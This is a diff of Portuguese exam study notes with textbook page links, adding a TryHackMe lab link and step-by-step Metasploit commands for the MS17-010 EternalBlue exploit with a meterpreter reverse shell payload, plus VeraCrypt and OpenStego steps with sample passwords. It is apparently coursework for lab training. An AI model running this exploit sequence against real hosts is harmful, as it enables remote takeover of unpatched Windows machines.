@@ -1,5 +1,5 @@
 Questões do Ilabguide / bookshelf
-Atividades e Anotações Importantes para prova.
+Atividades passadas pelo instrutor e Anotações Importantes para prova.
 
 
 ## 01 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/1842
@@ -102,16 +102,38 @@ https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4096
 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4150
 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4154
 
-
+https://tryhackme.com/room/blue
 
 ms17-010 - eternal blue
 msfconsole
+search ms17-010 
+use exploit/windows/smb/ms17_010_eternalblue or choose number
+options
+set rhosts <10.10.10.7 targ> 
+set payload windows/x64/meterpreter/reverse_tcp
+exploit
+Impacke
 exploit/windows/smb/ms17_010_eternalblue
 
-## 11 
+
+## 11 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4640
+https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4643
 
 
-veracrypt
+veracrypt 
+select file 
+--mount secret
+password qwerty@123
+
+## 12 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/907
+https://www.openstego.com/index-es.html
+
+openstego
+Extract Data
+Input Stego File < imagem que possa esta encryptada >
+Output Folder For Messager File < mensagem extraida caso tenha >
+Password ? exemplo Batman, qwerty@123, imagination 
+
 
 
 
